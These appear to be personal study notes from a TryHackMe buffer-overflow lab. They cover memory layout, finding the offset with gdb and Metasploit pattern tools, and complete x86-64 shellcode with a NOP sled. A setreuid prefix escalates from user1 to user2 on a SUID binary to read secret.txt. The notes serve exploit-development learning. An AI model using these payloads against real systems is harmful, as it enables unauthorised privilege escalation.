<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Buffer Overflow GDB</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Buffer Overflow GDB</h1><br/><p><strong><span style="text-decoration:underline;">THM Room : Buffer Overflows</span></strong></p><p></p><p><strong>Process Layout</strong></p><p></p><p>When a program runs on a machine, the computer runs the program as a process. Current computer architecture allows multiple processes to be run concurrently(at the same time by a computer). While these processes may appear to run at the same time, the computer actually switches between the processes very quickly and makes it look like they are running at the same time. Switching between processes is called a context switch. Since each process may need different information to run(e.g. The current instruction to execute), the operating system has to keep track of all the information in a process. The memory in the process is organised sequentially and has the following layout:  </p><p></p><p></p><p><a href="https://i.imgur.com/KmWsaIs.png"><img src="images/131-1.png" alt="images/131-1.png" /></a></p><p></p><p></p><p></p><p></p><p>• User stack contains the information required to run the program. This information would include the current program counter, saved registers and more information(we will go into detail in the next section). The section after the user stack is unused memory and it is used in case the stack grows(downwards)</p><p></p><p>• Shared library regions are used to either statically/dynamically link libraries that are used by the program</p><p></p><p>• The heap increases and decreases dynamically depending on whether a program dynamically assigns memory. Notice there is a section that is unassigned above the heap which is used in the event that the size of the heap increases.</p><p></p><p>• The program code and data stores the program executable and initialised variables.</p><p></p><p></p><p><strong>Example-1:</strong> </p><p></p><p><strong><span style="text-decoration:underline;">THM Buffer Overflows : Task - 7</span></strong></p><p>Using <strong>gdb</strong> </p><p></p><p>Commands:</p><p><strong>gdb program_name</strong></p><p><em><strong>gdb func-pointer</strong></em></p><p></p><p></p><p>Then Set the enviroment</p><p><em><strong>set exec-wrapper env -u LINES -u COLUMNS</strong></em></p><p></p><p>We then run this set command, which sets gdb to use the environment to use the absolute path of any executables we run: AKA it means any exploit you make inside gdb will work outside of gdb after doing that.</p><p></p><p>Then run the program</p><p><em><strong>run</strong></em></p><p></p><p>Now, to check for addresses of a function use the following:</p><p></p><p><strong>disassemble function_name</strong></p><p><em><strong>disassemble special</strong></em></p><p></p><p>We get the address of our return function here.</p><p></p><p><img src="images/131-2.png" alt="images/131-2.png" /></p><p></p><p>We will use the address of first instruction.</p><p></p><p>0x000000400567 [Since we have 6 bytes : Found by trying known input AAAA....]</p><p></p><p>In <strong>Little endian</strong> it will be: x67x50x40x00x00x00 or 675040000000</p><p></p><p></p><p>We convert this (675040) from Hex to ASCII.</p><p><strong>Note: </strong>Use browser tool as parts of output is hidden in terminal.</p><p></p><p>https://onlinehextools.com/convert-hex-to-ascii</p><p></p><p>The result is in picture below as it won&#39;t show in this document.</p><p></p><p><img src="images/131-3.png" alt="images/131-3.png" /></p><p></p><p>We enter the above ASCII value after 14 charecters to invoke the special function.</p><p></p><p></p><p><strong>Example-2:</strong> </p><p></p><p><strong><span style="text-decoration:underline;">THM Buffer Overflows : Task - 8</span></strong></p><p>Using <strong>gdb</strong> </p><p></p><p><img src="images/131-4.png" alt="images/131-4.png" /></p><p></p><p></p><p>We have the above configuration. We are logged as user1.</p><p>Our objective here is do buffer overflow on the buffer-overflow program and spawn a shell.</p><p>As the SUID bit is set to user2, the spawned shell should be able to read the contents of secret.txt</p><p></p><p>Examining the source code we find that there is a 140 charecters buffer that the program takes as agrument input and spits out the same as output.</p><p></p><p><img src="images/131-5.png" alt="images/131-5.png" /></p><p></p><p>In the tryhackme room, we look at the following picture carefully.</p><p></p><p><a href="https://i.imgur.com/zNMC7in.png"><img src="images/131-6.png" alt="images/131-6.png" /></a></p><p></p><p>Our objective here is to cross the 140 charecters of the buffer and overflow our data into return address.</p><p>Once we are able to manipulate the return address we can point it to anything.(Our shellcode which will be passed as argument)</p><p></p><p><strong>Note:</strong></p><p>It is important to note that, by simplying giving shellcode in the argument will do nothing. As the program will just prinout whatever is passed in the argument. But by changing to return address to the begining of the shell code. It will start execution.</p><p></p><p></p><p><strong>A) Finding out the offset.</strong></p><p>This is required to find out at how many charecters will we be overflowing into the Return address.</p><p></p><p><strong>Note:</strong> It is atleast 148 or more.  140 : Charecter Buffer + 8 : rbp</p><p><em><strong>The offset will look like this : buffer(140 bytes) + Alignment bytes (?) + rbp (8 bytes).</strong></em></p><p></p><p>2 Methods:</p><p><strong>Manual</strong></p><p></p><p><em><strong>gdb buffer-overflow</strong></em></p><p><em><strong>run $(python -c &quot;print(&#39;A&#39;*140)&quot;)</strong></em></p><p></p><p>This  will give no error as program expects a maximum of 140 charecters.</p><p>Now we will manually try to find the buffer by increamenting the no of As. We finally find it to be 158</p><p></p><p><em><strong>run $(python -c &quot;print(&#39;A&#39;*158)&quot;)</strong></em></p><p><img src="images/131-7.png" alt="images/131-7.png" /></p><p></p><p>So we know that with 158 bytes we override the <strong>6-bytes-long return address</strong>. It means our offset to reach the start of the return address is <strong>158-6</strong> = <strong>152</strong></p><p></p><p>Thus, return address starts from 152.</p><p>offset = buffer(140 bytes) + Alignment bytes (4) + rbp (8 bytes) ----→ From here return address starts.</p><p></p><p><strong>Metasploit Method</strong></p><p>Using metasploit tool we can find the offset.</p><p></p><p><em><strong>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200</strong></em></p><p></p><p>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</p><p></p><p>We feed the output to gdb runner.</p><p></p><p><em><strong>run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</strong></em></p><p></p><p><img src="images/131-8.png" alt="images/131-8.png" /></p><p></p><p>We do not get intresting result yet. But next we run the <strong>show registry </strong>command (<strong>i r</strong>) in gdb</p><p></p><p><em><strong>i r</strong></em></p><p><img src="images/131-9.png" alt="images/131-9.png" /></p><p></p><p>The highlighted address is the one that is overflown onto <strong>RBP</strong> now. We will use this to find the offset using another metasploit tool.</p><p></p><p><em><strong>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 6641396541386541</strong></em></p><p></p><p><img src="images/131-10.png" alt="images/131-10.png" /></p><p></p><p>This tells that <strong>RBP</strong> starts at 144.</p><p>We know that <strong>RBP</strong> is 8 bytes.</p><p></p><p>Hence <strong>Offset</strong> or start of return address is <strong>144+8</strong>=<strong>152</strong></p><p></p><p>Conclusion, in both manual and metasploit tool method we find the same offset of <strong>152</strong>.</p><p></p><p></p><p><strong>B) Picking a Shell Code:</strong></p><p></p><p>At this point we need a simple shell code. Exploit-db has 2 simple shell codes</p><p>Note; It has to be hexa decimal format so we can pass into the execution.</p><p>But all of these will give SIGILL error, even the one recommended in tryhackme room</p><p></p><p></p><p>Thus we use the one in https://www.arsouyes.org/blog/2019/54_Shellcode\</p><p></p><p>\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05</p><p></p><p></p><p>To find its length use python.</p><p><em><strong>python -c &quot;print(len (&#39;\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05&#39;))&quot;</strong></em></p><p></p><p>output: 40</p><p></p><p>Or Inside Python</p><p></p><p><em><strong>&gt;&gt;&gt; len (&#39;\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05&#39;)</strong></em></p><p></p><p>output: 40</p><p></p><p><em><strong>https://l1ge.github.io/tryhackme_bof1/</strong></em></p><p>The above write up explains completely regarding the shell codes. Following is a part.</p><p></p><p>&quot;We need a shell code that we will put in our buffer and have the  return address points to it. For now I just want a simple shell code,  just to drop a shell.</p><p>There are a few on exploit-db like <a href="https://www.exploit-db.com/exploits/41750">this one</a> or <a href="https://www.exploit-db.com/exploits/42179">that one</a>.  But I wont make you waste your time like I wasted mine. I&#39;ve tried most  of these simple shell codes and most of them didn&#39;t work on our case.  I  was getting SIGILL errors all the time.</p><p>I later found out why: These short shell codes don&#39;t have an exit  function call at their end, it means that once I injected these shell  codes in the buffer and mess up the memory, the binary was still trying  to execute these messed up instructions and thus, was reporting &quot;illegal  instruction error&quot;.</p><p><em>Side note : I was able to get a shell with these simple shell  codes but only by using another method : an env variable. With this  method you don&#39;t put your shell code in the buffer but in an environment  variable and then you give the return address the address of that  variable. That way you don&#39;t mess up the memory and I didn&#39;t get any  error.</em></p><p>So bellow is a similar simple shell code that i found but it includes  an exit call at the end that will prevent the SIGILL errors.&quot;</p><p></p><p></p><p>Note, this write up uses the same shell code as the one got from above link. (<em>The link has complete assembly code for the shellcode for further research</em>)</p><p></p><p><strong>C) Finding the address of the shellcode.</strong></p><p></p><p>Once we input the shellcode as user input argument, we need to know the starting point of shellcode to <strong>modify the return address to this value</strong>, such that it will start executing our shellcode once program runs.</p><p></p><p>We form our payload as follows.</p><p></p><p>Note: Instead of ‘A’ we can use ‘<strong>NOP</strong>’s </p><p>NOP tells the system to do no operation and RIP moves to the next address.</p><p>NOP can be denoted by <strong>\x90</strong></p><p></p><p></p><p>Why <strong>NOP</strong> is better that random data?</p><p>If we use random data or ‘A’ for the matter, we need to point our return address to the <em><strong>exact starting of our shellcode</strong></em>, else the program will throw error..</p><p>But with NOP in place, we can point our return address to <em><strong>any memory before our shellcode</strong></em> as long as its filled with NOPs. </p><p></p><p><em>I will explain with practical below.</em></p><p></p><p><strong>Using ‘A’</strong></p><p></p><p><em>run $(python -c &quot;print(&#39;A&#39;*80 + shellcode + ‘A’*32 + ‘B’*6)</em></p><p></p><p><strong>Total length: 80+40+32=152  and  6 bytes return address</strong></p><p><strong>Note:</strong> The 80 and 32 division can be done anyway.(say 90 - 22). </p><p>Keeping some bytes after the shellcode if useful if we try to make changes and the shellcode expands. In such case we need not to determine the address of shellcode again as the begining will still be the same.</p><p></p><p></p><p><em><strong>run $(python -c &quot;print(&#39;A&#39;*80 + &#39;\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05&#39; + &#39;A&#39;*32 + &#39;B&#39;*6)&quot;)</strong></em></p><p></p><p><strong>Also</strong>,  the last part BBBBBB is used as data because, that is the return address area, once we find the beginning of the shell code, we will replace it at the BBBBBB place.</p><p></p><p><strong>Using ‘NOP’</strong></p><p></p><p><em><strong>run $(python -c &quot;print(&#39;\x90&#39;*80 + &#39;\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05&#39; + &#39;\x90&#39;*32 + &#39;B&#39;*6)&quot;)</strong></em></p><p></p><p><img src="images/131-11.png" alt="images/131-11.png" /></p><p></p><p>The highlighted 424242424242 indicates the BBBBBB we has used. So the offset is correct.</p><p></p><p>Now, to find the starting point we will view the memory using the following command.</p><p>We will now examine the dump of the hex code with the command <em><strong>x/100x $rsp-200</strong></em> which dumps <strong>100*4 bytes</strong> from <strong>memory</strong> location <strong>$rsp -200 bytes</strong>.</p><p></p><p><em><strong>x/100x $rsp-200</strong></em></p><p></p><p><strong>Using A</strong>  (Indicated by 414141....)</p><p></p><p><img src="images/131-12.png" alt="images/131-12.png" /></p><p></p><p>we need to point to the <strong>exact starting point</strong> of shell code. The same is highlighted.</p><p>Each segment is <strong>4 bytes</strong></p><p>Our Shellcode starts at <strong>3rd segment</strong>.</p><p></p><p><strong>Our shellcode is at Line: 0x7fffffffe298 + We need to add 8 bytes to reach 3rd segment.</strong></p><p><strong>Thus start of our shell code is 0x7fffffffe298 + 0x8</strong> (Note: Only hexadecimal addition .ie if 12 = C)</p><p></p><p>The hexdecimal rules have to followed during the addition 9,A,B,C,D,E,F</p><p></p><p>This can be easily done by the following <strong>script</strong>.</p><p></p><p><strong>BASE=0x7fffffffe298</strong></p><p><strong>OFFSET=0x8</strong></p><p><strong>NEW_BASE=$(( $BASE + $OFFSET ))</strong></p><p><strong>NEW_BASE=`printf &quot;0x%X\n&quot; $NEW_BASE`</strong></p><p><strong>echo $NEW_BASE</strong></p><p></p><p>Or </p><p>Using simple shell one liner</p><p><strong>printf &quot;0x%X\n&quot; $((0x7fffffffe298 + 0x8))</strong></p><p></p><p>Or</p><p>Using simple shell one liner that does the addition in python</p><p><strong>printf &quot;0x%X\n&quot; $(python -c &quot;print(0x7fffffffe298 + 0x8)&quot;)</strong></p><p></p><p></p><p>We find the result(<strong>Our return address</strong>) to be : <strong>0x7FFFFFFFE2A0</strong></p><p></p><p><strong>Using NOP </strong>(Indicated by 909090....)</p><p></p><p> <img src="images/131-13.png" alt="images/131-13.png" /></p><p>Note: We get exactly similar memory view. </p><p>The shellcode starts at line: <strong>0x7fffffffe298</strong> and at the <strong>3rd segment</strong>.</p><p></p><p>But in this case as the memory is preceeded with <strong>NOPs</strong>, we can take any line (It should be before or having the shellcode)</p><p></p><p><img src="images/131-14.png" alt="images/131-14.png" /></p><p></p><p>Thus, the result(<strong>Our return address</strong>) can be : 	<strong>0x7fffffffe258</strong></p><p><strong>																				0x7fffffffe268</strong></p><p><strong>																				0x7fffffffe278</strong></p><p><strong>																				0x7fffffffe288</strong></p><p><strong>																				0x7fffffffe298</strong></p><p>																				</p><p>Therefore we use <strong>NOPs</strong> to reduce error chances.</p><p></p><p><strong>D) First Execution.</strong></p><p></p><p>Now that we have the return address.</p><p>We will use the exact one : <strong>0x7FFFFFFFE2A0</strong> and also use <strong>NOPs</strong> just to be extra secure.</p><p></p><p><strong>Return Address In Little Endian:</strong> \xa0\xe2\xff\xff\xff\x7f</p><p></p><p></p><p>Our Payload will be as follows: (Replace the BBBBBB with little endian format of return address)</p><p><em><strong>python -c &quot;print(&#39;\x90&#39;*80 + &#39;\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05&#39; + &#39;\x90&#39;*32 + &#39;\xa0\xe2\xff\xff\xff\x7f&#39;)&quot;</strong></em></p><p></p><p></p><p><strong>Note:</strong> Let&#39;s run it outside gdb to be sure we&#39;re in the good environment.</p><p></p><p><em><strong>./buffer-overflow $(python -c &quot;print(&#39;\x90&#39;*80 + &#39;\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05&#39; + &#39;\x90&#39;*32 + &#39;\xa0\xe2\xff\xff\xff\x7f&#39;)&quot;)</strong></em></p><p></p><p><img src="images/131-15.png" alt="images/131-15.png" /></p><p></p><p>Thus, we landed in a shell, however the shell didn&#39;t change to user2 as set by SETUID in the program.</p><p>We are still <strong>user1</strong> and cannot access the secret.txt file.</p><p></p><p></p><p><strong>E) About Setuid, Setreuid</strong></p><p>Again a good explanation is present at <em><strong>https://l1ge.github.io/tryhackme_bof1/</strong></em></p><p></p><p>Summary:</p><p>For security reasons,  the setuid bit is given only when it&#39;s necessary</p><p></p><p>When you drop the shell, /bin/sh looks at your <strong>real</strong> UID and not your <strong>effective</strong> UID. You can do research about the difference between real and effective UID but mostly, the funtion <strong>setuid()</strong>, except if its called on root, only sets your effective UID.  So even if we call setuid(1002), our real UID would still be 1001 and thus we&#39;ll remain user1 in the shell.  We need to use another function: <strong>setreuid()</strong></p><p></p><p>setreuid() can set both your real and effective uid.  So we need to modify our shell code to execute setreuid(1002,1002) before it executes /bin/sh. </p><p></p><p><em><strong>Side note:</strong></em><em> Most of the time in these exploits, we want to become root and we target binaries who have the setuid-root bit. In that case, simply doing setuid(0) would work because when called on root, setuid(0) also sets you real UID to root.</em></p><p></p><p></p><p><strong>F) Modifying the shellcode</strong> <strong>and exploiting</strong></p><p></p><p>Depending on your knowledge in assembly and in C, there are different ways to approach it:</p><p></p><p>    - You can write your shellcode in C, compile it, look at the assembly code, remove the bad characters and use it in your exploit.</p><p>    - You can go straight to assembly, find an existing shell code that uses setreuid() and modify it.</p><p>    - The easiest option : you can use pwntools</p><p></p><p><strong>Note:</strong> <em><strong>https://defuse.ca/online-x86-assembler.htm</strong></em> Online Assembly to Hex and Viceversa</p><p></p><p>We will use the pwntools for demo.</p><p></p><p><em><strong>pwn shellcraft -f d amd64.linux.setreuid 1002</strong></em></p><p>\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05</p><p></p><p><img src="images/131-16.png" alt="images/131-16.png" /></p><p></p><p>This part will be added to the <strong>beginning</strong> of our shellcode, for the program to change the <strong>effective</strong> UID.</p><p></p><p>New Modified Payload.</p><p><em><strong>python -c &quot;print(&#39;\x90&#39;*80 + &#39;\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05&#39; + &#39;\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05&#39; + &#39;\x90&#39;*18 + &#39;\xa0\xe2\xff\xff\xff\x7f&#39;)&quot;</strong></em></p><p></p><p><strong>Note:</strong> We also had to adjust our length keeping in mind the offset.</p><p>We added 14 bytes, so we are removing 14 NOPs from the end. Thus keeping our shellcode starting address same.</p><p></p><p>Now, we run this </p><p></p><p><em><strong>./buffer-overflow $(python -c &quot;print(&#39;\x90&#39;*80 + &#39;\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05&#39; + &#39;\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05&#39; + &#39;\x90&#39;*18 + &#39;\xa0\xe2\xff\xff\xff\x7f&#39;)&quot;</strong></em><strong>)</strong></p><p></p><p><img src="images/131-17.png" alt="images/131-17.png" /></p><p></p><p>Thus, our modification worked. We are now user2. We can read the contents of secret.txt and finish the task.</p><p></p></div>
</body>
</html>
